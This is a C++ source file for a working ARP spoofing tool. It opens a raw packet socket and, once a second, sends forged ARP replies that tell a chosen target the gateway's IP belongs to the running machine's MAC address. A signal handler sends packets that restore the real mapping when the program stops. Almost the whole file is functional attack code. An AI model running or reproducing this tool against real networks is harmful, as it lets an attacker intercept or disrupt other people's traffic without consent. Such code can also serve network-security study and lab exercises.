#include "l2/l2.h"
#include "l3/l3.h"
#include "netinfomanager.h"
#include <iostream>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <netinet/ether.h>
#include <memory.h>
#include <chrono>
#include <thread>
#include <signal.h>

using namespace std;
using namespace pol4b;

int sock;
ARP recover;

void signal_handler(int signum) {
    cout << "Caught signal " << signum << ", sending recover packets..." << endl;
    for(int i = 0; i < 10; i++) {
        if (send(sock, &recover, sizeof(recover), 0) < 0)
            break;
        this_thread::sleep_for(chrono::seconds(1));
    }
    close(sock);
    exit(signum);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        cout << "Usage : " << argv[0] << " <Target IP>" << endl;
        return 1;
    }
    else if(getuid() != 0) {
        cout << "You need root privileges to run this program." << endl;
        return 1;
    }

    IPv4Addr target_ip = argv[1];
    NetInfoManager &manager= NetInfoManager::instance();
    auto route_info = manager.get_best_routeinfo(target_ip);
    if (route_info == nullptr) {
        cout << "No route to target." << endl;
        return 1;
    }
    auto netinfo = manager.get_netinfo(route_info->name);
    if (netinfo == nullptr) {
        cout << "Failed to get interface info." << endl;
        return 1;
    }
    int if_index = NetInfoManager::instance().get_interface_index(route_info->name);
    if (if_index == -1) {
        cout << "Failed to get interface index." << endl;
        return 1;
    }
    MACAddr target_mac = ARP::get_mac_addr(target_ip);
    NetInfo gateway_info = ARP::get_gateway_info(route_info->name);
    IPv4Addr fake_ip = gateway_info.ip;

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock < 0) {
        cout << "Failed to create socket." << endl;
        return 1;
    }
    sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_protocol = htons(ETH_P_ARP);
    sa.sll_ifindex = if_index;
    if (::bind(sock, (sockaddr*)&sa, sizeof(sa)) < 0) {
        close(sock);
        cout << "Failed to bind socket." << endl;
        return 1;
    }
    ARP fake_reply = ARP::make_packet(netinfo->mac, target_mac, ARPHeader::Operation::Reply,
        netinfo->mac, fake_ip, target_mac, target_ip);
    recover = ARP::make_packet(netinfo->mac, target_mac, ARPHeader::Operation::Reply,
        gateway_info.mac, gateway_info.ip, target_mac, target_ip);

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    while(1) {
        if (send(sock, &fake_reply, sizeof(fake_reply), 0) < 0)
            break;
        this_thread::sleep_for(chrono::seconds(1));
    }

    close(sock);
    return 0;
}
